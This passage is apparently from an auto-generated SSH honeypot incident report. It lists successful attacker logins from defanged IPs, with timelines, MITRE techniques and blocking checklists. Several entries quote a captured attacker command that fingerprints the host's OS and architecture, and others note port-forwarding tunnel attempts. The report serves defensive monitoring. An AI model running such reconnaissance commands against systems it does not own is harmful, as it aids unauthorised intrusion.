| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 17:41 |
| **Last Seen** | 2026-07-21 17:43 |
| **Session Duration** | 106s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:41:55` | `cowrie.session.connect` |
| `2026-07-21 17:41:55` | `cowrie.client.version` |
| `2026-07-21 17:41:57` | `cowrie.client.kex` |
| `2026-07-21 17:42:15` | `cowrie.login.success` |
| `2026-07-21 17:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3db44d0eee7d

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]60` |
| **First Seen** | 2026-07-21 17:43 |
| **Last Seen** | 2026-07-21 17:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:43:03` | `cowrie.session.connect` |
| `2026-07-21 17:43:12` | `cowrie.login.success` |
| `2026-07-21 17:43:12` | `cowrie.session.params` |
| `2026-07-21 17:43:14` | `cowrie.log.closed` |
| `2026-07-21 17:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]60` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c59d51372060

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 17:43 |
| **Last Seen** | 2026-07-21 17:44 |
| **Session Duration** | 73s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:43:27` | `cowrie.session.connect` |
| `2026-07-21 17:43:28` | `cowrie.client.version` |
| `2026-07-21 17:43:28` | `cowrie.client.kex` |
| `2026-07-21 17:44:41` | `cowrie.login.success` |
| `2026-07-21 17:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f9db8e62f8c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 17:45 |
| **Last Seen** | 2026-07-21 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:45:44` | `cowrie.session.connect` |
| `2026-07-21 17:45:44` | `cowrie.client.version` |
| `2026-07-21 17:45:44` | `cowrie.client.kex` |
| `2026-07-21 17:45:45` | `cowrie.login.success` |
| `2026-07-21 17:45:45` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:45:45` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2c5797578c

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-07-21 17:46 |
| **Last Seen** | 2026-07-21 17:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:46:39` | `cowrie.session.connect` |
| `2026-07-21 17:46:40` | `cowrie.client.version` |
| `2026-07-21 17:46:40` | `cowrie.client.kex` |
| `2026-07-21 17:46:42` | `cowrie.login.success` |
| `2026-07-21 17:46:43` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c0384c9ac8

| Field | Detail |
|---|---|
| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 17:48 |
| **Last Seen** | 2026-07-21 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:48:40` | `cowrie.session.connect` |
| `2026-07-21 17:48:40` | `cowrie.client.version` |
| `2026-07-21 17:48:40` | `cowrie.client.kex` |
| `2026-07-21 17:48:42` | `cowrie.login.success` |
| `2026-07-21 17:48:42` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:48:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:48:42` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-622362f33f13

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]179` |
| **First Seen** | 2026-07-21 17:50 |
| **Last Seen** | 2026-07-21 17:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:50:09` | `cowrie.session.connect` |
| `2026-07-21 17:50:10` | `cowrie.client.version` |
| `2026-07-21 17:50:10` | `cowrie.client.kex` |
| `2026-07-21 17:50:11` | `cowrie.login.success` |
| `2026-07-21 17:50:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]179` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb71fe48406

| Field | Detail |
|---|---|
| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 17:50 |
| **Last Seen** | 2026-07-21 17:50 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:50:13` | `cowrie.session.connect` |
| `2026-07-21 17:50:13` | `cowrie.client.version` |
| `2026-07-21 17:50:13` | `cowrie.client.kex` |
| `2026-07-21 17:50:16` | `cowrie.login.success` |
| `2026-07-21 17:50:16` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:50:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:50:17` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca01876bb309

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 17:51 |
| **Last Seen** | 2026-07-21 17:51 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:51:07` | `cowrie.session.connect` |
| `2026-07-21 17:51:08` | `cowrie.client.version` |
| `2026-07-21 17:51:08` | `cowrie.client.kex` |
| `2026-07-21 17:51:17` | `cowrie.login.success` |
| `2026-07-21 17:51:21` | `cowrie.session.params` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:21` | `cowrie.command.success` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:21` | `cowrie.command.input` |
| `2026-07-21 17:51:27` | `cowrie.log.closed` |
| `2026-07-21 17:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7edd991b976c

| Field | Detail |
|---|---|
| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 17:52 |
| **Last Seen** | 2026-07-21 17:53 |
| **Session Duration** | 71s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:52:27` | `cowrie.session.connect` |
| `2026-07-21 17:52:27` | `cowrie.client.version` |
| `2026-07-21 17:52:27` | `cowrie.client.kex` |
| `2026-07-21 17:52:32` | `cowrie.login.success` |
| `2026-07-21 17:52:32` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:52:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:52:33` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74196574415e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-21 17:52 |
| **Last Seen** | 2026-07-21 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:52:37` | `cowrie.session.connect` |
| `2026-07-21 17:52:37` | `cowrie.client.version` |
| `2026-07-21 17:52:37` | `cowrie.client.kex` |
| `2026-07-21 17:52:37` | `cowrie.login.success` |
| `2026-07-21 17:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c856ba682ee

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-21 17:52 |
| **Last Seen** | 2026-07-21 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:52:37` | `cowrie.session.connect` |
| `2026-07-21 17:52:37` | `cowrie.client.version` |
| `2026-07-21 17:52:37` | `cowrie.client.kex` |
| `2026-07-21 17:52:38` | `cowrie.login.success` |
| `2026-07-21 17:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86cdb1b7deb4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-21 17:52 |
| **Last Seen** | 2026-07-21 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:52:47` | `cowrie.session.connect` |
| `2026-07-21 17:52:47` | `cowrie.client.version` |
| `2026-07-21 17:52:47` | `cowrie.client.kex` |
| `2026-07-21 17:52:48` | `cowrie.login.success` |
| `2026-07-21 17:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83c2bc4911a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-21 17:52 |
| **Last Seen** | 2026-07-21 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:52:48` | `cowrie.session.connect` |
| `2026-07-21 17:52:48` | `cowrie.client.version` |
| `2026-07-21 17:52:48` | `cowrie.client.kex` |
| `2026-07-21 17:52:49` | `cowrie.login.success` |
| `2026-07-21 17:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b0b8bd5349b

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 17:53 |
| **Last Seen** | 2026-07-21 17:54 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:53:50` | `cowrie.session.connect` |
| `2026-07-21 17:53:50` | `cowrie.client.version` |
| `2026-07-21 17:53:51` | `cowrie.client.kex` |
| `2026-07-21 17:53:53` | `cowrie.login.success` |
| `2026-07-21 17:53:53` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:54:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:54:04` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d911d8e50f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 17:56 |
| **Last Seen** | 2026-07-21 17:56 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:56:07` | `cowrie.session.connect` |
| `2026-07-21 17:56:10` | `cowrie.client.version` |
| `2026-07-21 17:56:10` | `cowrie.client.kex` |
| `2026-07-21 17:56:33` | `cowrie.login.success` |
| `2026-07-21 17:56:38` | `cowrie.session.params` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:38` | `cowrie.command.success` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:38` | `cowrie.command.input` |
| `2026-07-21 17:56:45` | `cowrie.log.closed` |
| `2026-07-21 17:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-612b6a49dd6f

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 17:56 |
| **Last Seen** | 2026-07-21 17:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:56:54` | `cowrie.session.connect` |
| `2026-07-21 17:56:54` | `cowrie.client.version` |
| `2026-07-21 17:56:55` | `cowrie.client.kex` |
| `2026-07-21 17:56:57` | `cowrie.login.success` |
| `2026-07-21 17:56:58` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:56:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:56:58` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73ae50e9529

| Field | Detail |
|---|---|
| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 17:59 |
| **Last Seen** | 2026-07-21 18:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:59:59` | `cowrie.session.connect` |
| `2026-07-21 17:59:59` | `cowrie.client.version` |
| `2026-07-21 17:59:59` | `cowrie.client.kex` |
| `2026-07-21 18:00:00` | `cowrie.login.success` |
| `2026-07-21 18:00:00` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:00:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 18:00:01` | `cowrie.direct-tcpip.data` |
| `2026-07-21 18:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9df0142f6eb

| Field | Detail |
|---|---|
| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 18:00 |
| **Last Seen** | 2026-07-21 18:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:00:20` | `cowrie.session.connect` |
| `2026-07-21 18:00:20` | `cowrie.client.version` |
| `2026-07-21 18:00:20` | `cowrie.client.kex` |
| `2026-07-21 18:00:21` | `cowrie.login.success` |
| `2026-07-21 18:00:22` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:00:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 18:00:22` | `cowrie.direct-tcpip.data` |
| `2026-07-21 18:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb815317c443

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:00 |
| **Last Seen** | 2026-07-21 18:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:00:30` | `cowrie.session.connect` |
| `2026-07-21 18:00:31` | `cowrie.client.version` |
| `2026-07-21 18:00:31` | `cowrie.client.kex` |
| `2026-07-21 18:00:35` | `cowrie.login.success` |
| `2026-07-21 18:00:40` | `cowrie.session.params` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:40` | `cowrie.command.success` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:40` | `cowrie.command.input` |
| `2026-07-21 18:00:43` | `cowrie.log.closed` |
| `2026-07-21 18:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5e8b9b4e88b

| Field | Detail |
|---|---|
| **Source IP** | `47.236.161[.]139` |
| **First Seen** | 2026-07-21 18:01 |
| **Last Seen** | 2026-07-21 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:01:56` | `cowrie.session.connect` |
| `2026-07-21 18:01:57` | `cowrie.client.version` |
| `2026-07-21 18:01:57` | `cowrie.client.kex` |
| `2026-07-21 18:01:58` | `cowrie.login.success` |
| `2026-07-21 18:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.161[.]139` to AbuseIPDB if not already reported
- [ ] Block `47.236.161[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bdc236f1c5d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-21 18:01 |
| **Last Seen** | 2026-07-21 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:01:58` | `cowrie.session.connect` |
| `2026-07-21 18:01:58` | `cowrie.client.version` |
| `2026-07-21 18:01:58` | `cowrie.client.kex` |
| `2026-07-21 18:01:58` | `cowrie.login.success` |
| `2026-07-21 18:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64efe7246cdf

| Field | Detail |
|---|---|
| **Source IP** | `202.111.183[.]30` |
| **First Seen** | 2026-07-21 18:02 |
| **Last Seen** | 2026-07-21 18:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:02:05` | `cowrie.session.connect` |
| `2026-07-21 18:02:05` | `cowrie.client.version` |
| `2026-07-21 18:02:05` | `cowrie.client.kex` |
| `2026-07-21 18:02:08` | `cowrie.login.success` |
| `2026-07-21 18:02:09` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.111.183[.]30` to AbuseIPDB if not already reported
- [ ] Block `202.111.183[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc2f81ad79b

| Field | Detail |
|---|---|
| **Source IP** | `163.223.244[.]3` |
| **First Seen** | 2026-07-21 18:02 |
| **Last Seen** | 2026-07-21 18:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:02:05` | `cowrie.session.connect` |
| `2026-07-21 18:02:06` | `cowrie.client.version` |
| `2026-07-21 18:02:06` | `cowrie.client.kex` |
